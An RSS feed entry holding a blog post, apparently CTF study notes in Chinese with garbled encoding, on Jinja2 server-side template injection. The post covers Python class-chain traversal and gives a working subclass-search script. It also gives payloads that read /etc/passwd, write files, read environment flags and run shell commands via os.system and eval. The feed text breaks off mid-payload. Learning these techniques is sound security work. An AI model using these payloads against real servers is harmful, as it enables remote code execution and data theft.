<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SSTI on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/ssti/</link><description>Recent content in SSTI on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Nov 2021 20:59:28 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml"/><item><title>SSTIå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>æ¨¡æ¿æ¸²æŸ“å¯ä»¥å€ŸåŠ©ä»£ç æž„é€ ï¼ˆå¦‚æ¡ä»¶ã€å¾ªçŽ¯è¯­å¥ç­‰ï¼‰ååˆ†æ–¹ä¾¿çš„åŠ¨æ€å‘ˆçŽ°å†…å®¹ï¼Œä½†å¦‚æžœç¼–å†™ä¸å½“å®¹æ˜“è¢«æ”»å‡»è€…æ³¨å…¥æ¶æ„å†…å®¹ä»Žè€Œæš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œæ‰§è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„çŽ°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡åž‹ï¼Œæ˜¯Flaskæ¡†æž¶çš„ä¸€éƒ¨åˆ†&lt;/p>
&lt;p>Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»åž‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»åž‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨&lt;u>è¿‡æ»¤å™¨&lt;/u>ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åŽï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ï¼ˆè¿™å¾ˆæœ‰åˆ©äºŽæˆ‘ä»¬æž„é€ æ¶æ„çš„payloadï¼‰ï¼Œæ¯”å¦‚è¿™æ ·çš„æ¨¡æ¿å¯ä»¥ç”¨é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">Hello, {{name|capitalize}}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2ä¹Ÿæ”¯æŒæŽ§åˆ¶è¯­å¥ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„&lt;u>forè¯­å¥&lt;/u>çš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% for comment in comments %}
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% endfor %}
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹æ‰€ä»¥æœ‰æ¨¡æ¿æ¸²æŸ“çš„æ¼æ´žæ˜¯å› ä¸ºåœ¨æ¸²æŸ“ä¼ é€’è¿›åŽ»çš„å‚æ•°æ—¶æ¨¡æ¿å¯ä»¥ç›´æŽ¥è®¿é—®Pythonçš„ä¸€äº›å¯¹è±¡åŠæ–¹æ³•ï¼Œå¯ä»¥æž„é€ ä¸€ä¸ªé•¿é•¿çš„ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å†™&amp;amp;å‘½ä»¤æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>ï¼šä¿å­˜ç±»å®žä¾‹æˆ–å¯¹è±¡å®žä¾‹çš„å±žæ€§å˜é‡é”®å€¼å¯¹å­—å…¸&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªå®žä¾‹æ‰€å±žçš„ç±»ï¼›pythonä¸­çš„æ–°å¼ç±»ï¼ˆæ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±žæ€§&lt;code>__class&lt;/code>ç”¨äºŽèŽ·å–å½“å‰å®žä¾‹å¯¹åº”çš„ç±»&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£æžæ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æžï¼ˆå³MRO - Method Resolution Orderï¼‰&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›žä¸€ä¸ªç±»ç›´æŽ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æŽ¥çˆ¶ç±»ï¼‰&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªç±»ç›´æŽ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå•ä¸ªï¼‰ï¼ˆç›¸å½“äºŽ&lt;code>__bases__[0]&lt;/code>ï¼‰ï¼Œå’Œ&lt;code>__mro__&lt;/code>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>ï¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›žç±»çš„æ‰€æœ‰å­˜æ´»å­ç±»çš„å¼•ç”¨ï¼ˆè€Œéžå®žä¾‹ï¼‰ï¼›pythonä¸­çš„ç±»éƒ½ç»§æ‰¿è‡ªobjectï¼Œåªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„&lt;code>__subclasses__()&lt;/code>æ–¹æ³•å°±å¯ä»¥èŽ·å–æƒ³è¦çš„å­ç±»&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥èŽ·å–file, osç­‰æ¨¡å—&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>ï¼šè¿”å›žä¸ç”¨å¯¼å…¥æ¨¡å—å¯ä»¥ç›´æŽ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚int()ï¼Œlist()ç­‰å†…å»ºå‡½æ•°ï¼ŒæŸ¥çœ‹çš„æ–¹æ³•æ˜¯&lt;code>dir(__builtins__)&lt;/code>ã€€ã€€
&lt;ul>
&lt;li>åœ¨py2ä¸­&lt;code>__builtins__&lt;/code>æ¨¡å—æ˜¯è§£é‡Šå™¨è‡ªåŠ¨åˆ›å»ºçš„å¯¹äºŽ&lt;code>__builtin__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼Œå¹¶éž&lt;code>__buitin__&lt;/code>æœ¬èº«ï¼ˆåœ¨ä¸»æ¨¡å—ä¸­æ—¶ï¼Œæƒ…å†µç±»ä¼¼æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå˜é‡å¹¶å¯¹å®ƒåšä¸€æ¬¡å¼•ç”¨ä¼ é€’ï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘ç›¸åŒï¼›å½“ä¸æ˜¯ä¸»æ¨¡å— è€Œæ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå¯ä»¥è¢«å¯¼å…¥çš„æ¨¡å—æ—¶ï¼Œ&lt;code>__builtins__&lt;/code>å…¶å®žæ˜¯å¯¹&lt;code>__builtin__.__dict__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼‰&lt;/li>
&lt;li>åœ¨py3ä¸­&lt;code>__builtin__&lt;/code>è¢«å‘½åä¸º&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸Ž &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="æž„é€ çš„åŽŸç†">æž„é€ çš„åŽŸç†&lt;/h2>
&lt;p>ä¸€è¨€ä»¥è”½ä¹‹ï¼šé€šè¿‡ä¸€ä¸ªé•¿é•¿çš„è°ƒç”¨ç»§æ‰¿é“¾æ¥å°†å†…å»ºçš„å‡½æ•°æˆ–æ¨¡å—æªå‡ºæ¥ç”¨&lt;/p>
&lt;h3 id="step1---æ‰¾åˆ°åŸºç±»object">step1 - æ‰¾åˆ°åŸºç±»object&lt;/h3>
&lt;p>é€šè¿‡å­—ç¬¦ä¸²ã€å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„å’Œå¾ˆç‰¹æ®Šçš„requestæ¥èŽ·å–åŸºç±»objectï¼Œmroå’Œbases[0]å‡å¯ï¼ˆæˆ–è€…æ˜¯base ä¸€æ ·çš„æ•ˆæžœï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---èŽ·å¾—èƒ½ç”¨çš„å­ç±»">step2 - èŽ·å¾—â€œèƒ½ç”¨çš„â€å­ç±»&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›žobjectåŸºç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å…¶ä¸­å«æœ‰&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>æ¨¡å—çš„å­ç±»ï¼›è¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å•ç‹¬å¯»æ‰¾ç‰¹å®šå­ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æƒ³è¦çš„æ¨¡å—æ‰¾åˆ°å¯¹åº”çš„å­ç±»ï¼Œè¿”å›žç´¢å¼•ä½ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">åˆ°è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°çš„&lt;/p>
&lt;p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„payloadå·²ç»æž„é€ å¥½ä¸€åŠäº†ï¼ˆä»¥ä¸‹indexå‡æŒ‡æˆ‘ä»¬éœ€è¦çš„subclassçš„ç´¢å¼•ä½ç½®ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce">step3 - è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>æ˜¯py2çš„ä¸“å±žï¼Œç›´æŽ¥å¯ä»¥ç”¨&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>æ¨¡å—å°±ä¸å¿…è¯´äº†ï¼Œæœ‰&lt;code>system()&lt;/code>å¯ä»¥ç›´æŽ¥rceçš„å‡½æ•°ï¼›åœ¨py2ä¸­è¿™ä¸¤ä¸ªå­ç±»å¯ä»¥ç›´æŽ¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸å«Œéº»çƒ¦çš„è¿˜å¯ä»¥å†å¥—ä¸€å±‚ï¼Œç”¨&lt;code>linecache&lt;/code>æ¥è°ƒç”¨&lt;code>os&lt;/code>ï¼Œpy2ä¸­æœ‰è¿™ä¸¤ä¸ªç±»å«æœ‰&lt;code>linecache&lt;/code>æ¨¡å—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3ä¸­å°±æ²¡è¿™ä¹ˆç›´æŽ¥ï¼Œè¦å…³æ³¨çš„æ¨¡å—æ˜¯&lt;code>__builtins__&lt;/code>ï¼Œå€ŸåŠ©å®ƒæ¥è°ƒç”¨å†…ç½®çš„&lt;code>open()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œç”¨&lt;code>eval()&lt;/code>å°†&lt;code>os&lt;/code>æ¨¡å—å¼•å…¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span 